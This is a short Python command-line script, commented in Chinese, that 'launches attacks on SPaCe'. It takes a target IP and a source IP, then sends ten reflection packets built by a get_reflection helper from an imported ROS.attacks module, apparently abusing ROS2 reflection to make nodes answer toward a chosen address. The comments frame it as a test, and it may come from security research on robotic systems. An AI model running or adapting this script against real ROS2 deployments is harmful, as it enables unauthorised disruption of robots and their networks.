#!/usr/bin/env python3
from ROS.attacks import *
import argparse
import socket
from datetime import datetime as dt
from datetime import timedelta
from subprocess import run
from shlex import split
from time import sleep
import signal

#parser 輸入參數設定
parser = argparse.ArgumentParser(
    description="Launches attacks on SPaCe. " "May need root privileges to run"
)
## 攻擊目標
parser.add_argument(
    "-t",
    "--target",         # 短選項 -t 與長選項 --target
    metavar="ADDRESS",  # 在 --help 中顯示的參數名稱
    type=validate_ip,   # 輸入值會先經過 validate_ip 函式檢查
    help="the IP address of the target of the attacks. "
    "It's required unless -n|--not-execute is passed.",
)
## 攻擊來源
parser.add_argument(
    "-s",
    "--source",
    metavar="ADDRESS",
    type=validate_ip,
    help="the IP address to be used as the source address of "
    "sent packets. It's required unless -n|--not-execute is passed.",
)
args = parser.parse_args()

try:

    # 利用 ROS2 的反射機制，讓目標節點回應封包\
    for i in range(10):
        send(get_reflection(args.target))
        sleep(0.1)
        print("\n[*] pkg have been send")
    print("\n[*] over")

except KeyboardInterrupt:
    print("\n[!] 測試已被使用者中斷。")
except Exception as e:
    print(f"\n[-] 發生非預期錯誤: {e}")
